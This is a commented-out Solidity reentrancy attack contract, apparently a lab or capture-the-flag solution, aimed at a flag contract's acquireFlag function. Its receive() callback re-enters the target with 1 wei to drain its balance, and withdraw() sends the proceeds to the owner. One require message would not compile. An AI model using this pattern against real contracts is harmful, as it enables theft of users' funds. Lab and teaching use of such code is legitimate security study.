// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// interface IOnsiteW2Lab1Flags {
//     function acquireFlag() external payable;
// }

// contract ReentrancyAttacker {
//     IOnsiteW2Lab1Flags public target;
//     bool private attacking;
//     address owner;

//     constructor(address _target) {
//         target = IOnsiteW2Lab1Flags(_target);
//         owner = msg.sender;
//     }
    
//     // 攻擊函數
//     function attack() external payable {
//         require(msg.value > 0, unicode"需要發送一些ETH來啟動攻擊");
//         require(!attacking, unicode"攻擊已經在進行中");
        
//         attacking = true;
//         target.acquireFlag{value: msg.value}();
//         attacking = false;
//     }

//     function getBalance() external view returns (uint256) {
//         return address(this).balance;
//     }
    
//     function fundContract() external payable {
//         require(msg.sender == owner, unicode"有合約所有者可以調用");
//     }
    
//     // 接收ETH時觸發的回調函數 - 這裡是重入攻擊的關鍵
//     receive() external payable {
//         // 只在第一次重入時執行，且不發送額外的ETH
//         if (attacking && address(target).balance > 0) {
//             // 重入調用，但這次不發送ETH（msg.value = 0會失敗）
//             // 我們需要發送最小金額來滿足require條件
//             target.acquireFlag{value: 1 wei}();
//         }
//     }
    
//     // 讓合約所有者提取攻擊後的ETH
//     function withdraw() external {
//         require(msg.sender == owner, "只有合約所有者可以調用");
//         payable(msg.sender).transfer(address(this).balance);
//     }
// } 